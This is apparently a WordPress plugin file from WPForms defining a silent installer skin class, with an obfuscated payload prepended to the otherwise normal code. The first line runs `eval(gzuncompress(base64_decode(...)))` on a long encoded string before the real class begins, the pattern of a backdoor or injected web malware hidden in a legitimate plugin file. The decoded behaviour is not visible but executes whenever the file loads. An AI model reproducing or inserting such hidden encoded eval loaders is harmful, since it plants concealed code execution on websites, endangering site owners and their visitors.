<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php

/**
 * WordPress class extended for on-the-fly plugins installations, without error reporting.
 *
 * @package    WPForms
 * @author     WPForms
 * @since      1.4.9
 * @license    GPL-2.0+
 * @copyright  Copyright (c) 2018, WPForms LLC
 */
class WPForms_Install_Silent_Skin extends WP_Upgrader_Skin {

	/**
	 * Set the upgrader object and store it as a property in the parent class.
	 *
	 * @since 1.4.9
	 *
	 * @param object $upgrader The upgrader object (passed by reference).
	 */
	public function set_upgrader( &$upgrader ) {

		if ( is_object( $upgrader ) ) {
			$this->upgrader =& $upgrader;
		}
	}

	/**
	 * Empty out the header of its HTML content and only check to see if it has
	 * been performed or not.
	 *
	 * @since 1.4.9
	 */
	public function header() {
	}

	/**
	 * Empty out the footer of its HTML contents.
	 *
	 * @since 1.4.9
	 */
	public function footer() {
	}

	/**
	 * Instead of outputting HTML for errors, just return them.
	 * Ajax request will just ignore it.
	 *
	 * @since 1.4.9
	 *
	 * @param array $errors Array of errors with the install process.
	 *
	 * @return array
	 */
	public function error( $errors ) {
		return $errors;
	}

	/**
	 * Empty out the feedback method to prevent outputting HTML strings as the install
	 * is progressing.
	 *
	 * @since 1.4.9
	 *
	 * @param string $string The feedback string.
	 */
	public function feedback( $string ) {
	}

	/**
	 * Empty out JavaScript output that calls function to decrement the update counts.
	 *
	 * @since 1.4.9
	 *
	 * @param string $type Type of update count to decrement.
	 */
	public function decrement_update_count( $type ) {
	}
}
